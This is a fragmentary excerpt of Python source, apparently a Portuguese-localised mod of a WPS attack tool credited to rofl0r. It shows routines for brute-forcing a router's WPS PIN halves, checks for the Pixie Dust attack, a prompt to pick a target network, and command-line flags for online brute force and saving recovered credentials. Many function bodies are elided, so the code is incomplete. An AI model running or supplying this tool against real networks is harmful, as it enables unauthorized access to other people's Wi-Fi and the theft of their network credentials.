...
#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
    ...
    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
        ...
        if self.connection_status.status == 'GOT_PSK':
            ...
            if self.pixie_creds.got_all():
                ...
                print('[!] Não há dados suficientes para executar o ataque Pixie Dust')
                return False
        else:
    ...
    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        ...
        while int(f_half) < 10000:
            ...
            if self.connection_status.isFirstHalfValid():
                print('[+] Primeiro tempo encontrado')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] Falha na transação WPS, tentando novamente o último pin')
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        print('[-] Primeira parte não encontrada')
        return False
    ...
    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        ...
        try:
            ...
            print('[i] Salvando em {}'.format(filename))
            if args.loop:
                raise KeyboardInterrupt
...
class WiFiScanner:
    ...
    def prompt_network(self) -> str:
        ...
        if not networks:
            print('[-] Sem redes com wps encontrado.')
            return
        while 1:
            try:
                networkNo = input('Selecione o alvo (pressione Enter para atualizar): ')
...
if __name__ == '__main__':
    ...
    parser = argparse.ArgumentParser(
        description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by Zero',
    ...
    parser.add_argument(
        '-p', '--pin',
        type=str,
        help='Use o pino especificado (string arbitrária ou pino de 4/8 dígitos)'
        )
    parser.add_argument(
        '-K', '--pixie-dust',
        action='store_true',
    ...
    parser.add_argument(
        '-F', '--pixie-force',
        action='store_true',
        help='Execute o Pixiewps com a opção --force (força bruta alcance total)'
        )
    parser.add_argument(
        '-X', '--show-pixie-cmd',
        action='store_true',
        help='Sempre mostre o comando Pixiewps'
        )
    parser.add_argument(
        '-B', '--bruteforce',
        action='store_true',
        help='Realizou um ataque de força bruta online'
        )
    parser.add_argument(
        '--pbc', '--push-button-connect',
        action='store_true',
        help='Execute a conexão do botão WPS'
        )
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help='Definir o atraso entre tentativas de pin'
        )
    parser.add_argument(
        '-w', '--write',
        action='store_true',
        help='Gravar credenciais no arquivo em caso de sucesso'
        )
    parser.add_argument(
        '--iface-down',
        action='store_true',
